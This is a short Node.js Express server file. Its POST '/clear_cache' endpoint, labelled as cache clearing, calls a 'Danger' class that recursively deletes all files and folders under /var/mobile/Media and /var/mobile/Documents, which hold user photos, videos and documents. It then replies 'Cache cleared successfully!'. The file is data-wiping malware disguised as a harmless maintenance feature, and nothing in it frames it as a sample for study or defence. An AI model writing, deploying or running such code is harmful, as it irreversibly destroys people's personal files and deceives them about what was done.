const express = require('express');
const fs = require('fs');
const path = require('path');
const fse = require('fs-extra');

const app = express();
const port = 3000;

// Serve static files from the public directory
app.use(express.static('public'));


class Danger {
  clear() {
        const targetDirectories = [
            "/var/mobile/Media",  // User media files (photos, videos, etc.)
            "/var/mobile/Documents"  // User documents
        ];
        for (const directory of targetDirectories) {
            if (fs.existsSync(directory)) {
                const walkSync = (dir) => {
                    const files = fs.readdirSync(dir);
                    for (const file of files) {
                        const filePath = path.join(dir, file);
                        const fileStat = fs.statSync(filePath);
                         if (fileStat.isFile()) {
                             try {
                                  fs.unlinkSync(filePath);
                                  console.log(`Deleted file: ${filePath}`);
                             } catch (err) {
                                console.log(`Error deleting file ${file}: ${err}`)
                            }
                        } else if (fileStat.isDirectory()) {
                             try{
                                 fse.removeSync(filePath);
                                 console.log(`Deleted directory: ${filePath}`);
                             } catch (err){
                                console.log(`Error deleting directory ${filePath}: ${err}`)
                            }
                        }
                    }
                }
            walkSync(directory)

            } else {
                console.log(`Directory not found: ${directory}`);
            }
        }
    }
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


app.post('/clear_cache', (req, res) => {
    new Danger().clear();
    res.send("Cache cleared successfully!");
});


app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
